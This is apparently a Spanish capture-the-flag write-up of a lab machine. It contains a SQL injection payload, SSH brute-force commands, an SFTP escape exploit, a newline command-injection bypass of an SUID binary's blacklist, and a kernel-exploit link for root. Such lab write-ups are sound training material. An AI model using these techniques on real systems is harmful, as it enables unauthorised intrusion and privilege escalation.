------
- Tags:
------
## Técnicas utiilizadas
- HTML Injection  
- XSS Injection  
- SQL Injection (SQLI) - Error Based  
- OpenSSH <= 6.6 SFTP misconfiguration universal exploit (RCE)  
- Script Modification  
- Binary Analysis [GHIDRA/Radare2]  
- In-depth analysis with Radare2 [Tips and tricks]  
- Command Injection - User Pivoting  
- Ubuntu Xenial Privilege Escalation - Kernel Exploitation
## Procedimiento

![[Pasted image 20230709233905.png]]

---------
#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina, podemos encontrar los siguientes puertos abiertos:
```ruby
# nmap -sCV -p2222,80 10.10.10.66 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 22:30 MST
Nmap scan report for 10.10.10.66
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: NOTES
2222/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH 32bit (not so recent ver)
| ssh-hostkey: 
|   1024 e271845ded078998688b6e78da844cb5 (DSA)
|   2048 bd1c119a5b15d2f62876c3407c806dec (RSA)
|   256 bfe825bfca9255bccaa496c743d05173 (ECDSA)
|_  256 6f1430b1394754b75a01be962ca79658 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.93%I=7%D=7/10%Time=64ACE91B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2B,"SSH-2\.0-OpenSSH\x2032bit\x20\(not\x20so\x20recent\x20ver\)\r\n"
SF:);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds
```

Un escaneo de las tecnolgías web con **whatweb** nos muestra el siguiente resultado:
```ruby
# whatweb 10.10.10.66
http://10.10.10.66 [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.66], PasswordField[pass], Title[NOTES]
```

De primera la web no nos muestra mucho, tenemos un login y nada más. Podemos intentar descubrir rutas con **GoBuster** y despues de un rato de buscar directorios y archivos podemos dar con lo siguiente:
![[Pasted image 20230710223628.png]]

Pero si intentamos visualizar la pagina, vemos que nos redirige al **index.php**.

------
#### HTML Injection  
En la pagina, tenemos la capacidad de **Iniciar sesión** o de **Registrar un usuario**. Si registramos un usuario y posteriormente nos logueamos, podemos ver el siguiente apartado:
![[Pasted image 20230710223743.png]]

Tenemos la capacidad de dejar algún "Comentario" y a su vez de subir algún archivo adjunto con el comentario. Si intentamos subir un archivo, vemos que solo permite cierto tipos de archivo y nos muestra el siguiente error:
![[Pasted image 20230710223826.png]]

Antes descubrimos un directorio con **Gobuster** que nos redirigia al **Index.php** pero quizás ahora que estamos logeados podemos ver algo diferente, asi que procedemos a visitar la pagina:
![[Pasted image 20230710223920.png]]

Vemos solo **:** que en realidad no nos dice mucho. Intentando algunas cosas en el apartado de comentarios, descubrimos que el campo del titulo es vulnerable a **HTML injection** por lo tanto es probable que tambien sea vulnerable a **XSS Stored Injection**:
![[Pasted image 20230710224102.png]]

--------
#### XSS Injection
Podemos intentar fuzzear por parametros en el archivo que descubrirmos anteriormente con **Gobuster**, lanzamos el siguiente comando con wfuzz
![[Pasted image 20230710224522.png]]

Y vemos que nos descrube el parametro **Filename**, además de esto, nos coloca el input que le damos al parametro en la pagina. Apuntamos hacia el propio archivo **Donwload.php** en el parametro **Filename** y podemos ver el contenido del script en el **source code** de la pagina:
![[Pasted image 20230710224609.png]]

En el codigo podemos ver que se usa el metodo **Basename**, esto basicamente lo que hace es retornar el ultimo valor de la cadena, asi que no sera posible aplicar un **Directory Path Transversal**, solo podemos apuntar a archivos residentes en el actual directorio de la pagina web.

Bien, si ahora intentamos injectar un tipico comando de **XSS** en el campo que era vulnerable a **HTML Injeciton** observamos que tambien es vulnerable a **XSS**. ¿Por que no intentar robar las cookies de alguien que posiblemente este viendo la pagina? Si apuntamos a un recurso que recida en nuestra maquina a través del **XSS** podemos confirmar si hay alguien verificando los comentarios:
![[Pasted image 20230710224748.png]]

Y no, solo llega la petición que nosotros mismos tramitamos al recargar la pagina. 

------
#### SQL Injection (SQLI) - Error Based  
Algo nos hace pensar que el camino no esta en el **dashboard** de comentarios. Regresamos al **login** e intentamos algunas de las inyecciones basicas de **SQL** y no cuelan ninguna. Ahora, ¿y si intentamos inyectar en el apartado de registro?, si lo hacemos y posteriormente iniciamos sesión, vemos un mensaje de **SQL Error**:
![[Pasted image 20230710224914.png]]

Bueno, si nos ponemos a pensar, ¿Por que esta dando error? quizás la query se este malformando cuado nosotros le metemos el `select * from users where admin = '' or 1=1-- -';` debido a que quizas no se esta intentando consultar la información de ese modo, quizas lo esta haciendo asi: `select * from users where admin = ('admin') or 1=1-- -');`. Si intentamos con ese formato e iniciamos sesión, vemos como podemos visualizar todas las notas existentes en la pagina web e incluso las nuestras:
![[Pasted image 20230710224942.png]]

Procedemos a pasar la consulta por **BurpSuite** para facilitarnos todo el trabajo de registrarnos e iniciar sesión. Mirando la información a traves del SQLi, podemos ver unas credenciales las cuales podemos utilizar para iniciar sesión:
![[Pasted image 20230710230327.png]]

-------
#### OpenSSH <= 6.6 SFTP misconfiguration universal exploit (RCE)  
Con la lista de credenciales que obtuvimos, haremos un ataque de fuerza bruta sobre el **SSH** que descubrirmos en la etapa de reconocimiento, podemos usar **Hydra** o **CrackMapExec** pero por mayor comodidad usaremos **Hydra**:
```
# hydra -s 2222 ssh://10.10.10.80 -L users.txt -P passwords.txt
```

y vemos credenciales validas para conectarnos:
![[Pasted image 20230710230457.png]]

Si hubieramos decidido usar **CrackMapExec**, la ejecución seria de la siguiente manera:
```
# crackmapexec ssh 10.10.10.80 --port 2222 -u users.txt -p password.txt --no-bruteforce
```

Si intentamos iniciar sesión, vemos una cabecera que nos indica que ha existido un error:
![[Pasted image 20230710230658.png]]

Esto puede ser debido a que quizás el usuario solo tiene capacidad de loguearse en **sftp**, llegamos a esta conclusión porque el nombre de usuario nos indica un **FTP** pero el puerto **21** no esta abierto, asi que probablemente se este usando **SFTP** y ahora si podemos iniciar sesión en la maquina victima:
![[Pasted image 20230710230823.png]]

Nos damos cuenta rapidamente de todas las limitaciones que tenemos al no estar en un terminal interactiva, podemos buscar por google si hay alguna manera de abusar de este servicio para de alguna manera burlarlo y tener una terminal completamente interactiva y encontramos un exploit [sftp-exploit](https://github.com/SECFORCE/sftp-exploit). Adicional a esta herramienta, también tenemos la posibilidad de crear una montura del sistema con **sshfs**, lo hariamos de la siguiente manera:
```
# sshfs -p 2222 ftpuser@10.10.10.80: /mnt/montura/
```

Bien, nosotros tiraremos del exploit para ganar la shell, lo unico que tenemos que hacer es clonarnos el repositorio y ejecutar el script de la forma que viene indicada:
```
# python2 sftp-exploit.py
```

y vemos la respuesta:
¡![[Pasted image 20230710231657.png]]

Ahora podemos entablarnos una reverse shell.

---------
#### Binary Analysis [GHIDRA/Radare2]  
##### Ghidra
Si hacemos la enumeración basica, podemos encontrar que hay un binario **SGUID** que tiene una funcionalidad indentifca a la del comando a nivel de sistema **ls** lo cual es bastante extraño, podemos intentar transferir el binario a nuestro sistema para hacer **reversing**. 

Dentro, vemos que existe una función de nombre **main** que suele contener todo el flujo del programa. Echando un ojo, vemos que hay un bucle que se va incrementando dependiendo de los parametros que vayamos poniendo:
```c#
  for (local_34 = 1; local_34 < param_1; local_34 = local_34 + 1) {
    if (((**(char **)(param_2 + (long)local_34 * 8) == '-') &&
        (*(char *)(*(long *)(param_2 + (long)local_34 * 8) + 1) == 'b')) &&
       (*(char *)(*(long *)(param_2 + (long)local_34 * 8) + 2) == '\0')) {
      bVar2 = true;
    }
    else {
      sVar3 = strlen((char *)local_30);
      sVar4 = strlen(*(char **)(param_2 + (long)local_34 * 8));
      local_30 = (undefined8 *)realloc(local_30,sVar4 + sVar3 + 2);
      uVar6 = 0xffffffffffffffff;
      puVar7 = local_30;
      do {
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        cVar1 = *(char *)puVar7;
        puVar7 = (undefined8 *)((long)puVar7 + (ulong)bVar8 * -2 + 1);
      } while (cVar1 != '\0');
      *(undefined2 *)((long)local_30 + (~uVar6 - 1)) = 0x20;
      strcat((char *)local_30,*(char **)(param_2 + (long)local_34 * 8));
    }
```

Hay un condicional de por medio que verifica que exista un **-** ( guion ) además que este este acompañado de la letra **b** o de un **\0** ( null byte ).
El resto del codigo que se ejecutara si se cumple la condicion es el siguiente:
```c#
  local_28 = (char *)((long)local_30 + 7);
  if (*local_28 != '\0') {
    pcVar4 = strstr(local_28,"$(");
    if (pcVar4 == (char *)0x0) {
      pcVar4 = strchr(local_28,10);
      if ((pcVar4 == (char *)0x0) || (validator)) {
        for (; *local_28 != '\0'; local_28 = local_28 + 1) {
          pcVar4 = strchr("|`&><\'\"\\[]{};",(int)*local_28);
          if (pcVar4 != (char *)0x0) {
                    /* WARNING: Subroutine does not return */
            exit(0);
          }
        }
        goto LAB_00400956;
      }
    }
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
LAB_00400956:
  system((char *)local_30);
  free(local_30);
  return 0;
```

En el codigo, vemos que hay una llamada a nivel de sistema una vez se completa la condición, es decir, una vez se coloca **-b** hace esta llamada a nivel de sistema para ejecutar un comando. Dentro del codigo, vemos que hay una cierta sanitización, contempla algunos caracteres en una lista negra que al colocarlos, el programa simplemente termina.

###### Command Injection - User Pivoting  
Para burlar esta sanitización podemos hacer lo siguiente:
```
./sls -b '
quote> whoami'
content exploits nmap sexcott
```

Y vemos que hay ejecutación de comandos.

##### Radare2
Otra opción para hacer reversion es **Radare2**, podemos abrirnos el binario con este:
```
# Radare2 ./sls
```

**Analiza todas las funciones**:
```
radare2> aaa
```

**Lista todas las funciones existentes**:
```
radare2> afl
```

**Sincronizarte con una función**:
```
radare2> s <function>
```

**Muestra el contenido de la función ( ensamblador )**:
```
radare2> pdf
```

**Muestra el codigo ( en C )**:
```
radare2> pdc
```

**Muestra en formato bloque todo el flujo del programa**:
```
radare2> VV
```

**Centrar la funcion requerida:**
```
:> OC
```

**Cambiar el nombre de una variable**:
```
:> afvn new_name var_50h
:> VV
```

#### Ubuntu Xenial Privilege Escalation - Kernel Exploitation
Revisando la versión del Kernel, nos percatamos que es bastante antigua, echando un ojo por **google** encontramos un [exploit](https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c) que nos permite abusar del kernel. Lo ejecutamos y tendriamos root.










